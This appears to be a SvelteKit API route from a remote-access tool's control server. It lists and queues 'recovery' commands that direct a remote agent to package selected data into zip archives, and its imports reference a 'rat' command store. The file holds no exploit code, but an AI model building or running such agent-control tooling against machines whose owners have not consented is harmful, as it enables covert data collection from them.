import { randomUUID } from 'crypto';
import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { registry, RegistryError } from '$lib/server/rat/store';
import { listRecoveryArchives } from '$lib/server/recovery/storage';
import type {
	RecoveryCommandPayload,
	RecoveryRequestInput,
	RecoveryQueueResponse
} from '$lib/types/recovery';

function normalizeArchiveName(input: string | undefined | null): string {
	const trimmed = input?.trim();
	if (!trimmed) {
		return '';
	}
	const name = trimmed.endsWith('.zip') ? trimmed : `${trimmed}.zip`;
	return name.replace(/[^\w\-\.]+/g, '-');
}

export const GET: RequestHandler = async ({ params }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	const archives = await listRecoveryArchives(id);
	return json({ archives });
};

export const POST: RequestHandler = async ({ params, request }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	let payload: RecoveryRequestInput;
	try {
		payload = (await request.json()) as RecoveryRequestInput;
	} catch (err) {
		throw error(400, 'Invalid recovery request payload');
	}

	if (!payload?.selections || payload.selections.length === 0) {
		throw error(400, 'At least one recovery target must be selected');
	}

	const requestId = randomUUID();
	const archiveName = normalizeArchiveName(payload.archiveName);
	const commandPayload: RecoveryCommandPayload = {
		requestId,
		selections: payload.selections,
		archiveName: archiveName || undefined,
		notes: payload.notes?.trim() || undefined
	};

	try {
		const response = registry.queueCommand(id, { name: 'recovery', payload: commandPayload });
		return json({ requestId, commandId: response.command.id } satisfies RecoveryQueueResponse);
	} catch (err) {
		if (err instanceof RegistryError) {
			throw error(err.status, err.message);
		}
		throw error(500, 'Failed to queue recovery request');
	}
};
